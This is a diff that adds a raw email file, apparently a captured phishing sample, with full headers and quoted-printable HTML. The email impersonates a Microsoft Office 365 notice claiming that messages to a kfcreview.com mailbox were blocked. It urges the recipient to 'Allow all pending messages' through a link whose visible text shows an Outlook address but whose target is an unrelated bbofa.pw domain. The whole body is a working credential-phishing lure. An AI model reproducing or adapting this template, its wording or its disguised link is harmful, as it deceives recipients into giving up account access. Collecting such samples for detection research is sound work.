@@ -1,0 +1,206 @@
+Return-Path: <account@postmaster.net>
+Received: from [81.200.19.126] ([81.200.19.126])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id i1hk18jlp58sbeo89k9f2nv8b6s28v1qgfd4cu01
+ for zingerpie@kfcreview.com;
+ Fri, 25 Sep 2026 07:53:00 +0000 (UTC)
+Received-SPF: softfail (spfCheck: transitioning domain of postmaster.net does not designate 81.200.19.126 as permitted sender) client-ip=81.200.19.126; envelope-from=account@postmaster.net; helo=[81.200.19.126];
+Authentication-Results: amazonses.com;
+ spf=softfail (spfCheck: transitioning domain of postmaster.net does not designate 81.200.19.126 as permitted sender) client-ip=81.200.19.126; envelope-from=account@postmaster.net; helo=[81.200.19.126];
+ dmarc=none header.from=postmaster.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFYmNobTBqVVFYWFFNaG5zM09sOHhtMjdaQnM5T1hZckxGMFNpMmJpbktldlpPbzYzbExYRThZenNBd2Z0UUJmYTlFYnhyQ3JTLzRBQWt3S0xYVUxyMFlvbmdVSDQ5YmJLbzJRRFR1UVFUaUdocTM3ZjJvUVF2a0R2YTNqMnlmN1JCMXplNjZ0RHJ1MGp3US9JR1NqU1E4SVlTQlVuSlhrWExPd2o0b0lUVG13Vkt5ajhJN2xvdTVCbDU2dW8yNzRFNmtiRllOUkFqL2tlZTl5SFpXeHJCNzNoOE8rQ3F6M29VcG9wRzBtVm9TOWM3UGIrWlNyWCsxVWUxM20rQkhVSS90ZzBDaWhsejc1WHViR1FQTVN5ZGhSL1NlVFgyd2ZzbVJ2bHZRTXZKZXVjcFNOYUJmUjFZOExsNExSVnNzUUU9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=Ud9qOCtQMkxG3lX8z6k6K548I9NjET7p77QVZMlDibx9el53/VaKKvAN94eWxYL1ZUc218F+is3B4aCpN9wd5oINXMWmh6q0Q/jLOCfZT08hHIjkhpTaY2aXyRmgqFwRbU4j8VKQglmsLTXv/TyFt0VVr4roIBxSlHvhxTSC+r8=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1790322780; v=1; bh=KI/rWSQdv/g1Bg5i2Xhu7sDRqoSnd6uLgt7gefbuWTY=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: Mailbox Support <account@postmaster.net>
+To: zingerpie@kfcreview.com
+Subject: You have some messages pending on the server
+Date: 25 Sep 2026 10:52:58 +0300
+Message-ID: <20260925105258.E22F69EAC3F741A5@postmaster.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"548" style=3D'transform-origin: left top; color: black !imp=
+ortant; text-transform: none; line-height: inherit; letter-spacing: normal;=
+ padding-top: 0px; padding-bottom: 0px; font-family: "Segoe UI", "Segoe UI =
+Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica=
+ Neue", sans-serif; font-size: 15px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal; border-collapse: collapse; max-widt=
+h: 548px; border-spacing: 0px; orphans: 2; widows: 2;=20
+font-size-adjust: inherit; font-stretch: inherit; transform: scale(0.968978=
+); font-feature-settings: inherit; background-color: white !important; font=
+-variant-ligatures: normal; font-variant-caps: normal; font-variant-numeric=
+: inherit; font-variant-east-asian: inherit; font-variant-alternates: inher=
+it; font-variant-position: inherit; font-variant-emoji: inherit; font-optic=
+al-sizing: inherit; font-kerning: inherit; font-variation-settings: inherit=
+; font-language-override: inherit;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;' cellspacing=3D"0"=
+ cellpadding=3D"0" min-scale=3D"0.968978102189781"><tbody><tr><td style=3D'=
+text-align: left; padding-bottom: 10px; font-family: "Segoe UI", Frutiger, =
+Arial, sans-serif; font-size: 16px; white-space: normal !important;' data-o=
+lk-copy-source=3D"MessageBody"><strong>
+</strong><table style=3D'text-transform: none; letter-spacing: normal; font=
+-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; margin-bot=
+tom: 24px; word-spacing: 0px; orphans: 2; widows: 2; background-color: rgb(=
+255, 255, 255); -webkit-text-stroke-width: 0px; text-decoration-thickness: =
+initial; text-decoration-style: initial; text-decoration-color: initial;' b=
+order=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td valign=3D"mi=
+ddle" style=3D"font-size: 8.1px;"><strong>
+<img width=3D"32" height=3D"32" style=3D"border: 0px currentColor; border-i=
+mage: none; display: block;"=20
+src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAA=
+ABcUlEQVR4nO3YMQ1CQRBAwTsEkGABRQjAC2YQQAtisECCgcPAr/nFmym32mxetfN7Oa8Rc3y85=
+9b89hq5Wxz2XoB9CSBOAHECiBNAnADiBBAngDgBxAkgTgBxAogTQJwA4gQQJ4A4AcQJIE4AcQKI=
+E0CcAOIEECeAOAHECSBOAHECiBNAnADiBBAngDgBxAkgTgBxAogTQJwA4gQQJ4A4AcQJIE4AcQK=
+IE0CcAOIEECeAOAHECSBOAHECiBNAnADiBBAngDgBxAkgTgBxAgAAAEiZ4/5Zey/xd9fT3Bqv58=
+jdwh8gTgBxAogTQJwA4gQQJ4A4AcQJIE4AcQKIE0CcAOIEECeAOAHECSBOAHECiBNAnADiBBAng=
+DgBxAkgTgBxAogTQJwA4gQQJ4A4AcQJIE4AcQKIE0CcAOIEECeAO
+%0AAHECSBOAHECiBNAnADiBBAngDgBxAkgTgBxAogTQJwA4gQQJ4A4AcQJIE4AcQKIE0DcD7bzD=
+OLQOL8WAAAAAElFTkSuQmCC"></strong></td><td valign=3D"middle" style=3D'color=
+: rgb(17, 24, 39); padding-left: 12px; font-family: "Segoe UI", Helvetica, =
+Arial, sans-serif; font-size: 18px;'><p align=3D"center"><span style=3D"fon=
+t-size: 19.3px;"><span style=3D"font-size: 18px;"><span style=3D"font-size:=
+ 16.7px;"><span style=3D"font-size: 15.4px;"><span style=3D"font-size: 14.1=
+px;"><span style=3D"font-size: 12.8px;">
+<span style=3D"font-size: 14.1px;"><span style=3D"font-size: 15.4px;"><span=
+ style=3D"font-size: 16.7px;"><span style=3D"font-size: 18px;"><span style=
+=3D"font-size: 19.3px;">Some&nbsp;messages couldn't be delivered to your ma=
+ilbox.</span></span></span></span></span></span></span></span></span></span=
+></span><br></p></td></tr></tbody></table></td></tr><tr>
+<td style=3D'text-align: center; padding-top: 0px; padding-bottom: 20px; fo=
+nt-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 24px; white-=
+space: normal !important;'>
+<span style=3D'text-align: center; color: rgb(0, 0, 0); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", Fruti=
+ger, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: 4=
+00; word-spacing: 0px; float: none; display: inline !important; white-space=
+: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font=
+-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
+width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>Security o=
+r policy settings at&nbsp;kfcreview.com</span>
+<span style=3D'text-align: center; color: rgb(0, 0, 0); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", Fruti=
+ger, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: 4=
+00; word-spacing: 0px; float: none; display: inline !important; white-space=
+: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font=
+-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
+width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'> has rejec=
+ted&nbsp;incoming messages.</span></td></tr><tr><td style=3D"padding-right:=
+ 0px; padding-bottom: 15px; padding-left: 0px; white-space: normal !importa=
+nt; border-spacing: 0px;">
+<table style=3D"line-height: inherit; padding-top: 0px; padding-bottom: 0px=
+; font-family: inherit; font-size: inherit; font-style: inherit; font-varia=
+nt: inherit; font-weight: 600; border-collapse: collapse; max-width: 548px;=
+ border-spacing: 0px; font-size-adjust: inherit; font-stretch: inherit; fon=
+t-feature-settings: inherit; font-optical-sizing: inherit; font-kerning: in=
+herit; font-variation-settings: inherit; font-language-override: inherit;">=
+<tbody><tr>
+<td style=3D'width: 181px; text-align: left; font-family: "Segoe UI", Fruti=
+ger, Arial, sans-serif; font-size: 15px; font-weight: 600; vertical-align: =
+bottom; white-space: normal !important;'><font color=3D"white"><span style=
+=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; bor=
+der-image: none; color: black !important; vertical-align: baseline; font-si=
+ze-adjust: inherit; font-stretch: inherit;">Multiple senders</span></font><=
+/td>
+<td style=3D'width: 186px; text-align: center; font-family: "Segoe UI", Fru=
+tiger, Arial, sans-serif; font-size: 15px; font-weight: 600; vertical-align=
+: bottom; white-space: normal !important;'><font color=3D"white"><span styl=
+e=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; bo=
+rder-image: none; color: black !important; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">Office 365</span></font></td>
+<td style=3D'width: 181px; text-align: right; font-family: "Segoe UI", Frut=
+iger, Arial, sans-serif; font-size: 15px; font-weight: 600; vertical-align:=
+ bottom; white-space: normal !important;'><font color=3D"white"><span style=
+=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; bor=
+der-image: none; color: black !important; vertical-align: baseline; font-si=
+ze-adjust: inherit; font-stretch: inherit;">zingerpie@kfcreview.com</span><=
+/font></td></tr><tr>
+<td style=3D'width: 181px; text-align: left; padding-top: 0px; padding-bott=
+om: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 1=
+4px; font-weight: 400; vertical-align: middle; white-space: normal !importa=
+nt;'><font color=3D"white"><span style=3D"font: inherit; margin: 0px; paddi=
+ng: 0px; border: 0px currentColor; border-image: none; color: black !import=
+ant; vertical-align: baseline; font-size-adjust: inherit; font-stretch: inh=
+erit;"><br></span></font></td>
+<td style=3D'width: 186px; text-align: center; padding-top: 0px; padding-bo=
+ttom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size:=
+ 14px; font-weight: 400; vertical-align: middle; white-space: normal !impor=
+tant;'></td><td style=3D'width: 181px; text-align: right; padding-top: 0px;=
+ padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif;=
+ font-size: 14px; font-weight: 400; vertical-align: middle; white-space: no=
+rmal !important;'><font color=3D"white">
+<span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curren=
+tColor; border-image: none; color: rgb(192, 0, 0) !important; vertical-alig=
+n: baseline; font-size-adjust: inherit; font-stretch: inherit;"><b>Action R=
+equired</b></span></font></td></tr><tr><td style=3D"padding: 0px; white-spa=
+ce: normal !important;" colspan=3D"3">
+<table style=3D"font: inherit; padding: 0px; border-collapse: collapse; bor=
+der-spacing: 0px; font-size-adjust: inherit; font-stretch: inherit;" cellsp=
+acing=3D"0" cellpadding=3D"0"><tbody><tr height=3D"10"><td style=3D"padding=
+: 0px; width: 180px; height: 10px; line-height: 10px; font-size: 6px; white=
+-space: normal !important;" bgcolor=3D"#cccccc"></td><td style=3D"padding: =
+0px; width: 4px; height: 10px; line-height: 10px; font-size: 6px; white-spa=
+ce: normal !important;" bgcolor=3D"white"></td>
+<td style=3D"padding: 0px; width: 180px; height: 10px; line-height: 10px; f=
+ont-size: 6px; white-space: normal !important;" bgcolor=3D"#cccccc"></td><t=
+d style=3D"padding: 0px; width: 4px; height: 10px; line-height: 10px; font-=
+size: 6px; white-space: normal !important;" bgcolor=3D"white"></td><td styl=
+e=3D"padding: 0px; width: 180px; height: 10px; line-height: 10px; font-size=
+: 6px; white-space: normal !important;" bgcolor=3D"#c00000"></td></tr></tbo=
+dy></table></td></tr><tr>
+<td style=3D'padding: 0px; width: 181px; text-align: left; line-height: 20p=
+x; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; f=
+ont-weight: 400; white-space: normal !important;'></td><td style=3D'padding=
+: 0px; width: 186px; text-align: center; line-height: 20px; font-family: "S=
+egoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; w=
+hite-space: normal !important;'></td>
+<td style=3D'padding: 0px; width: 181px; text-align: right; line-height: 20=
+px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; =
+font-weight: 400; white-space: normal !important;'><font color=3D"white"><s=
+pan style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentC=
+olor; border-image: none; color: rgb(192, 0, 0) !important; vertical-align:=
+ baseline; font-size-adjust: inherit; font-stretch: inherit;">Policy violat=
+ion or system error</span></font></td></tr></tbody>
+</table></td></tr><tr><td style=3D'text-align: left; font-family: "Segoe UI=
+", Frutiger, Arial, sans-serif; font-size: 15px; font-weight: 400; white-sp=
+ace: normal !important;'><em>Couldn't deliver messages&nbsp;from the follow=
+ing senders:</em></td></tr><tr><td style=3D'padding-top: 0px; padding-botto=
+m: 15px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 1=
+4px; white-space: normal !important; max-width: 548px;'><a href=3D"mailto:j=
+shpart@provalue.net">jshpart@provalue.net</a>
+, <a href=3D"mailto:mhp@newultel.net">mhp@newultel.net</a>, <a href=3D"mail=
+to:mickhaydn@pacinfo.com">mickhaydn@pacinfo.com</a>, <em><u>view more</u></=
+em></td></tr><tr><td style=3D"width: 528px; padding-top: 0px; padding-right=
+: 10px; padding-left: 10px; white-space: normal !important;"><br><table sty=
+le=3D"font: inherit; padding: 0px; width: 528px; margin-left: 0px; font-siz=
+e-adjust: inherit; font-stretch: inherit; background-color: rgb(242, 245, 2=
+50) !important;"><tbody><tr>
+<td style=3D'padding: 0px 10px; font-family: "Segoe UI", Frutiger, Arial, s=
+ans-serif; font-size: 21px; white-space: normal !important; background-colo=
+r: rgb(242, 245, 250) !important;'><u>How to Fix It</u></td></tr><tr><td st=
+yle=3D'padding: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Arial, san=
+s-serif; font-size: 16px; font-weight: 400; white-space: normal !important;=
+ background-color: rgb(242, 245, 250) !important;'></td></tr><tr>
+<td style=3D'padding: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Aria=
+l, sans-serif; font-size: 16px; font-weight: 400; white-space: normal !impo=
+rtant; background-color: rgb(242, 245, 250) !important;'>Review your email =
+security and delivery settings for any restrictions that may be blocking or=
+ preventing incoming messages. Turn on <em><strong>'Allow all pending messa=
+ges'</strong> </em>at <a href=3D"https://bbofa.pw/bb/off/go">
+https://outlook.kfcreview.com/pending-email-permission/</a>&nbsp;to release=
+ all pending messages on the server.</td></tr></tbody></table></td></tr><tr=
+><td style=3D'padding-top: 10px; padding-bottom: 4px; font-family: "Segoe U=
+I", Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; white-s=
+pace: normal !important;'><br><em>
+Was this helpful? <a title=3D"https://go.microsoft.com/fwlink/p/?LinkID=3D7=
+17199" style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curre=
+ntColor; border-image: none; vertical-align: baseline; font-size-adjust: in=
+herit; font-stretch: inherit;" href=3D"https://go.microsoft.com/fwlink/p/?L=
+inkID=3D717199" target=3D"_blank" rel=3D"noopener noreferrer" data-auth=3D"=
+NotApplicable" data-linkindex=3D"0">Send feedback to Microsoft</a>.</em></t=
+d></tr></tbody></table></body></html>
